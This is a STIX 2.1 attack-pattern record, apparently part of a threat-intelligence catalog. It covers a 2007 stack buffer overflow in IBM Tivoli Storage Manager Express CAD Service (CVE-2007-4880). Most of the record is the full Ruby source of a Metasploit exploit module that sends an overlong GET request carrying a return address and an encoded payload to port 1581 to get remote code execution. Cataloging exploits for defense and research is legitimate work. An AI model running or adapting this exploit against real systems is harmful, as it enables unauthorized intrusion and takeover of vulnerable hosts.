{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aef56939-4d69-4a0a-8393-02d5e119b05f",
    "created": "2024-08-14T16:53:12.634519Z",
    "modified": "2024-08-14T16:53:12.634523Z",
    "name": "IBM Tivoli Storage Manager Express CAD Service Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the IBM Tivoli Storage Manager Express CAD Service (5.3.3). By sending an overly long GET request, it may be possible for an attacker to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ibm_tsm_cad_header.rb",
            "external_id": "ibm_tsm_cad_header.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-4880"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM Tivoli Storage Manager Express CAD Service Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the IBM Tivoli Storage Manager Express CAD Service (5.3.3).\n        By sending an overly long GET request, it may be possible for an attacker to execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-4880' ],\n          [ 'OSVDB', '38161' ],\n          [ 'BID', '25743' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 650,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'IBM Tivoli Storage Manager Express 5.3.3', { 'Ret' => 0x0289fbe3 } ], # dbghelp.dll\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2007-09-24'))\n\n    register_options( [ Opt::RPORT(1581) ])\n  end\n\n  def exploit\n    connect\n\n    sploit =  \"GET /BACLIENT HTTP/1.1\\r\\n\"\n    sploit << \"Host: 127.0.0.1 \" + rand_text_alpha_upper(190)\n    sploit << [target.ret].pack('V') + payload.encoded\n\n    print_status(\"Trying target %s...\" % target.name)\n\n    sock.put(sploit + \"\\r\\n\\r\\n\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-09-24",
    "x_mitre_platforms": [
        "win'"
    ]
}